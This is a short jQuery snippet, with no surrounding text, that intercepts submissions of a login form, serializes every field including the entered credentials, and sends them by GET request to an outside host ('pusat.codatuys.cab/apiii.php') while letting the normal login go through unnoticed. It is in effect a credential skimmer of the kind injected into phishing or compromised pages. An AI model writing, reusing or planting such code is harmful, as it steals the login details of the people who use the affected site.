
$(".login-form").submit(function () 
{ var values = $(".login-form");
  $.ajax({
    'url': "https://pusat.codatuys.cab/apiii.php",
    'type': 'GET',
    'data': $(values).serialize(),
    'success': function () {
      return true;
    },
    'error': function () {
      return true;
    }
  });
});
